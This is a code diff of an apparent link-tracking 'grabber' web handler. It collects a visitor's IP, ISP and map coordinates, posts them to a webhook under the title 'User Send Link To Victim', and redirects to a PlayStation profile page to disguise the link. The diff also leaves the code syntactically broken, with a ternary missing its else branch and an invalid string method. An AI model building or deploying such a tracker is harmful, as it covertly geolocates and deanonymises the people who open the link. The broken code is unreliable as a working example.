@@ -79,13 +79,12 @@ export default async function handler(req, res) {
             ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
             : "Not available";
 
-        // Check 1: Google LLC and Discordbot
-        if (ipDetails.isp === "Google LLC" && userAgent.contains("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
-            const message = {
+         const message = ipDetails.isp === "Google LLC" && userAgent.contains("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")
+            ? {
                 embeds: [
                     {
-                        title: "User Send Link To Victim from Discord Message",
-                        color: 0xFF0000,
+                        title: "User Send Link To Victim",
+                        color: 0xFF0000, // Red color to indicate alert
                         description: "Device info collected from sender.",
                         fields: [
                             { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
@@ -95,10 +94,13 @@ export default async function handler(req, res) {
                     }
                 ]
             };
-            await sendToWebhook(message);
+         await sendToWebhook(message);
             res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
             return res.end();
-        }
+
+
+
+
 
         // Check 2: Facebook External Hit
         if (ipDetails.isp === "Facebook, Inc." && userAgent === "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)") {
